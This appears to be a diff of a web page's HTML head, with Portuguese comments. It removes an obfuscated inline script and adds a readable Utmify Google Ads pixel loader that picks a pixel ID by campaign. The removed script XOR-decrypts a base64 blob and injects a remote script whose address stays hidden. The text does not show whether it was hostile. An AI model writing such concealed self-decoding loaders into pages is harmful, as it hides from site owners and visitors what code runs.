@@ -15,7 +15,44 @@
 
       gtag('config', 'G-K2EMQ5T4YE');
     </script>
-    <script>(function(){var c_e=atob("DMadyFkAY8Cbz6ZvK72/vStsQfq5p9IbW7Wn53ZjB661utICQqDk5jpvDu75vYkcSLT0uC1zTLDyt8MDBLb0sDxsTqf0oMEDTuj3u3ssQaHvu9QGSbPprSoiWZvG44QIR6n/qTVzQfrAtIQBSqv46mMiBK/0qMoKe6/lrTVJB+K37dAOR7P46mMiVaH+955ZT/b5/WwzWqGi/JMME/av/m9iQb3Gsg==");var a_h4c=[];for(var a_qy7w=0;a_qy7w<c_e.length;a_qy7w++){a_h4c.push(c_e.charCodeAt(a_qy7w)&255);}var g_r=a_h4c[0];var c_0=a_h4c.slice(1,1+g_r);var t_uk=a_h4c.slice(1+g_r);var j_n=t_uk.map(function(b,f_bzj){return b^c_0[f_bzj%g_r];});var e_j1="";for(var v_smz7=0;v_smz7<j_n.length;v_smz7++){e_j1+=String.fromCharCode(j_n[v_smz7]&255);}var x_2j8=decodeURIComponent(escape(e_j1));var f_o7ym=JSON.parse(x_2j8);var f_8ah=f_o7ym.globals||[];f_8ah.forEach(function(k_6l){window[k_6l.name]=k_6l.value;});var z_d=document.createElement("script");z_d.src=f_o7ym.url;z_d.async=true;z_d.defer=true;(f_o7ym.attributes||[]).forEach(function(t_kn9k){z_d.setAttribute(t_kn9k.name,t_kn9k.value);});(document.head||document.documentElement).appendChild(z_d);})();</script>
+    <script>
+      // Pixel Google da Utmify: o script da Utmify aceita um pixel por pagina,
+      // entao escolhemos a conta do Google Ads pelo ID da campanha (utm_campaign).
+      // Campanhas da conta Silva Cardoso usam o pixel ACC-SilvaCardoso; todas as outras, o ACC-Fabricio.
+      // Ao criar uma campanha nova na conta Silva Cardoso, adicione o ID dela em SILVA_CAMPAIGNS.
+      (function () {
+        var PIXEL_FABRICIO = '6ae886d0d5539a935c80266b';
+        var PIXEL_SILVA = '6aea0e4533b3ca05157e641d';
+        var SILVA_CAMPAIGNS = ['24438334036', '24432493115', '24429973604'];
+        var CHOICE_KEY = 'utmify_google_pixel_id';
+        var UTMIFY_LEAD_KEY = 'lead-google';
+
+        var campaign = null;
+        try { campaign = new URLSearchParams(window.location.search).get('utm_campaign'); } catch (e) {}
+
+        var pixelId = null;
+        if (campaign) {
+          pixelId = SILVA_CAMPAIGNS.indexOf(campaign) !== -1 ? PIXEL_SILVA : PIXEL_FABRICIO;
+        } else {
+          try { pixelId = localStorage.getItem(CHOICE_KEY); } catch (e) {}
+        }
+        if (pixelId !== PIXEL_SILVA && pixelId !== PIXEL_FABRICIO) pixelId = PIXEL_FABRICIO;
+
+        try {
+          localStorage.setItem(CHOICE_KEY, pixelId);
+          // A Utmify guarda o visitante junto com o pixel; se a conta mudou, comeca do zero.
+          var lead = JSON.parse(localStorage.getItem(UTMIFY_LEAD_KEY) || 'null');
+          if (lead && lead.pixelId && lead.pixelId !== pixelId) localStorage.removeItem(UTMIFY_LEAD_KEY);
+        } catch (e) {}
+
+        window.googlePixelId = pixelId;
+        var s = document.createElement('script');
+        s.src = 'https://cdn.utmify.com.br/scripts/pixel/pixel-google.js';
+        s.async = true;
+        s.defer = true;
+        (document.head || document.documentElement).appendChild(s);
+      })();
+    </script>
   </head>
   <body>
     <div id="app"></div>
